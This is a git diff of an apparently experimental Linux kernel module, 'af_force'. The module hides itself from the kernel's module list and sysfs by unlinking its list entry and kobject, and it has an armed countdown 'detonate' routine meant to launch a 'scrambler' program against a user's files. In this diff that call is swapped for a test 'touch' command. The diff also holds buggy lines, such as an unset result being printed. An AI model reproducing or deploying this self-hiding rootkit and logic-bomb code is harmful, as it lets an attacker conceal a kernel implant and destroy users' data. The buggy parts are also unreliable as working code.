@@ -25,11 +25,13 @@ int armed = 0;
 int hidden = 0;
 static struct timer_list countdown_timer;
 
-static struct list_head *modlist;
+static struct list_head *modlist; // Declare pointer to empty linked list, courtesy of kernel dev
+static struct kobject *kobject_parent;
 
 
 static int call_scrambler(void) {
 	// struct subprocess_info *sub_info;
+	/*
 	char *args[] = {"/usr/bin/scrambler", "/home/bob/files", NULL};
 	static char *envp[] = {
 		"HOME=/",
@@ -45,23 +47,66 @@ static int call_scrambler(void) {
 	// }
 	// return call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
 	// return call_usermodehelper(args[0], args, envp, UMH_WAIT_PROC);
-	return 0;
+	// return 0;
+	*/
+	printk(KERN_INFO "call_scrambler called...\n");
+	char * envp[] = { "HOME=/", NULL };
+	char * argv[] = { "/usr/bin/touch", "/home/bob/touched", NULL };
+
+	
+    int res;
+    call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
+    
+    // res = call_usermodehelper( argv[0], argv, envp, UMH_WAIT_PROC );
+    printk(KERN_INFO "umh call result: %i\n", res);
+    return 0;
+    
+    // return 0;
 }
 
 
+// Structs to save info
+
+// whats going on here...?
 static void hide_me(void) {
 	if (hidden) return;
-	modlist = THIS_MODULE->list.prev;
-	list_del(&THIS_MODULE->list);
-	kobject_del(&THIS_MODULE->mkobj.kobj);
-	THIS_MODULE->sect_attrs = NULL;
-	THIS_MODULE->notes_attrs = NULL;
+
+	printk(KERN_INFO "BEFORE DELETE ------");
+	printk(KERN_INFO "list.prev: %lx\n", &THIS_MODULE->list.prev);
+	printk(KERN_INFO "mkobkj.kobj: %lx\n", &THIS_MODULE->mkobj.kobj);
+
+	modlist = THIS_MODULE->list.prev; // THIS_MODULE is macro that refers to current module, similar to self (?)
+	list_del(&THIS_MODULE->list); // Assuming that THIS_MODULE has a property "list" which is it's sys entry.. (?)
+
+	kobject_parent = THIS_MODULE->mkobj.kobj.parent;
+	kobject_del(&THIS_MODULE->mkobj.kobj);  // Unlink kobj "from hierarchy".  These 2 lines alone seem to hide if very effectively...
+
+	// lets get some info about what we're deleting:
+	// printk(KERN_DEBUG "af_force: THIS_MODULE->sect_attrs = %s\n", typeof(THIS_MODULE->sect_attrs));
+	// printk(KERN_DEBUG "af_force: THIS_MODULE->notes_attrs = %s\n", typeof(THIS_MODULE->notes_attrs));
+
+	// THIS_MODULE->sect_attrs = NULL;
+	// THIS_MODULE->notes_attrs = NULL;
 	hidden=1;
 }
 
 static void unhide_me(void) {
+	int r;
 	if (hidden == 0) return;
-	list_add(&THIS_MODULE->list, modlist);
+	list_add(&THIS_MODULE->list, modlist); // opposite of list_del
+
+	if ((r = kobject_add(&THIS_MODULE->mkobj.kobj, kobject_parent, "rt")) < 0) {
+		printk(KERN_ALERT "Error restoring kobject!\n");
+	} else {
+		printk(KERN_INFO "kobject_add result: %i\n", r);
+	}
+
+	printk(KERN_INFO "AFTER RESTORE ------");
+	printk(KERN_INFO "list.prev: %lx\n", &THIS_MODULE->list.prev);
+	printk(KERN_INFO "mkobkj.kobj: %lx\n", &THIS_MODULE->mkobj.kobj);
+
+
+	// kobject_add(&THIS_MODULE->mkobj.kobj, modlist->mkobj.kobj);
 	hidden = 0;
 }
 
@@ -125,10 +170,11 @@ static long device_ioctl(struct file *filp, unsigned int cmd, unsigned long args
 
 void detonate (unsigned long data)
 {
+	// int res;
     if (armed == 1 ) {
         printk(KERN_DEBUG "af_force: Kaboom!\n");
-        int res = call_scrambler();
-        printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
+        call_scrambler();
+        // printk(KERN_DEBUG "uesrmodehelper_exec result: %i", res);
     } else {
         printk(KERN_DEBUG "af_force: It's quiet...\n"); 
     }
